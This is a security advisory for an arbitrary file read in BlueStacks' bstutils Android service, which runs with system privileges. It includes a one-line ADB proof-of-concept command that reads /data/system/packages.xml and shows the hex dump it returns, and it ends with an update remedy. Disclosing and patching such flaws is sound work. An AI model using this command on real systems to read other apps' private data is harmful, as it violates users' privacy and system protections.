# Summary

An unprotected method in a bstutils service in BlueStacks 4.120 and below on Mac
and 4.110 and below on Winodws allows a local attacker to read the contents of
arbitrary files with system privileges.

# Description

BlueStacks is an Android emulator available for Windows and Mac systems. It works
by creating a virtual smartphone/tablet device inside the host operating system.
The emulated Android OS includes multiple custom binaries developed by BlueStacks
developers, including a system service called bstutils (identified by an interface
descriptor com.bluestacks.os.IbstUtilsService). This service contains a method
readFile() (transaction id 6 on a tested system), which returns the contents of a file
located under the path provided as method’s argument.

readFile() method can be called by any user, including an unprivileged third-party app.
However, methods in the bstutils service are executed by the system_server process
which runs with system and gid. This means that the method can be used to retrieve
contents not accessible to the caller, including private data of other installed
applications.

# Reproduction

Reproducing this issue in ADB is as simple as running the following command:

```service call bstutils 6 s16 /data/system/packages.xml```

The result should be a hex dump of packages.xml file:


```
Result: Parcel(
0x00000000: 00000000 0005caf0 003f003c 006d0078 ‘……..<.?.x.m.’
0x00000010: 0020006c 00650076 00730072 006f0069 ‘l. .v.e.r.s.i.o.’
0x00000020: 003d006e 00310027 0030002e 00200027 ‘n.=.’.1…0.’. .’
0x00000030: 006e0065 006f0063 00690064 0067006e ‘e.n.c.o.d.i.n.g.’
0x00000040: 0027003d 00740075 002d0066 00270038 ‘=.’.u.t.f.-.8.’.’
0x00000050: 00730020 00610074 0064006e 006c0061 ‘ .s.t.a.n.d.a.l.’
0x00000060: 006e006f 003d0065 00790027 00730065 ‘o.n.e.=.’.y.e.s.’
0x00000070: 00200027 003e003f 003c000a 00610070 ”. .?.>…<.p.a.’
0x00000080: 006b0063 00670061 00730065 000a003e ‘c.k.a.g.e.s.>…’
0x00000090: 00200020 00200020 0076003c 00720065 ‘ . . . .<.v.e.r.’
0x000000a0: 00690073 006e006f 00730020 006b0064 ‘s.i.o.n. .s.d.k.’
0x000000b0: 00650056 00730072 006f0069 003d006e ‘V.e.r.s.i.o.n.=.’
0x000000c0: 00320022 00220035 00640020 00740061 ‘”.2.5.”. .d.a.t.’
0x000000d0: 00620061 00730061 00560065 00720065 ‘a.b.a.s.e.V.e.r.’
0x000000e0: 00690073 006e006f 0022003d 00220033 ‘s.i.o.n.=.”.3.”.’
0x000000f0: 00660020 006e0069 00650067 00700072 ‘ .f.i.n.g.e.r.p.’
0x00000100: 00690072 0074006e 0022003d 006f0067 ‘r.i.n.t.=.”.g.o.’
0x00000110: 0067006f 0065006c 006d002f 00720061 ‘o.g.l.e./.m.a.r.’
0x00000120: 0069006c 002f006e 0061006d 006c0072 ‘l.i.n./.m.a.r.l.’
0x00000130: 006e0069 0037003a 0031002e 0031002e ‘i.n.:.7…1…1.’
0x00000140: 004e002f 0046004f 00360032 002f0056 ‘/.N.O.F.2.6.V./.’
0x00000150: 00360033 00360033 00320033 003a0032 ‘3.6.3.6.3.2.2.:.’
0x00000160: 00730075 00720065 0072002f 006c0065 ‘u.s.e.r./.r.e.l.’
0x00000170: 00610065 00650073 006b002d 00790065 ‘e.a.s.e.-.k.e.y.’
0x00000180: 00220073 002f0020 000a003e 00200020 ‘s.”. ./.>… . .’
0x00000190: 00200020 0076003c 00720065 00690073 ‘ . .<.v.e.r.s.i.’
0x000001a0: 006e006f 00760020 006c006f 006d0075 ‘o.n. .v.o.l.u.m.’
0x000001b0: 00550065 00690075 003d0064 00700022 ‘e.U.u.i.d.=.”.p.’
0x000001c0: 00690072 0061006d 00790072 0070005f ‘r.i.m.a.r.y._.p.’
0x000001d0: 00790068 00690073 00610063 0022006c ‘h.y.s.i.c.a.l.”.’
0x000001e0: 00730020 006b0064 00650056 00730072 ‘ .s.d.k.V.e.r.s.’
0x000001f0: 006f0069 003d006e 00320022 00220035 ‘i.o.n.=.”.2.5.”.’
0x00000200: 00640020 00740061 00620061 00730061 ‘ .d.a.t.a.b.a.s.’
0x00000210: 00560065 00720065 00690073 006e006f ‘e.V.e.r.s.i.o.n.’
0x00000220: 0022003d 00220033 00660020 006e0069 ‘=.”.3.”. .f.i.n.’
0x00000230: 00650067 00700072 00690072 0074006e ‘g.e.r.p.r.i.n.t.’
0x00000240: 0022003d 006f0067 0067006f 0065006c ‘=.”.g.o.o.g.l.e.’
0x00000250: 006d002f 00720061 0069006c 002f006e ‘/.m.a.r.l.i.n./.’
0x00000260: 0061006d 006c0072 006e0069 0037003a ‘m.a.r.l.i.n.:.7.’
0x00000270: 0031002e 0031002e 004e002f 0046004f ‘..1…1./.N.O.F.’
0x00000280: 00360032 002f0056 00360033 00360033 ‘2.6.V./.3.6.3.6.’
0x00000290: 00320033 003a0032 00730075 00720065 ‘3.2.2.:.u.s.e.r.’
0x000002a0: 0072002f 006c0065 00610065 00650073 ‘/.r.e.l.e.a.s.e.’
0x000002b0: 006b002d 00790065 00220073 002f0020 ‘-.k.e.y.s.”. ./.’

//… output truncated for brevity
```

# Remedy

Update BlueStacks to version 4.130 or later.
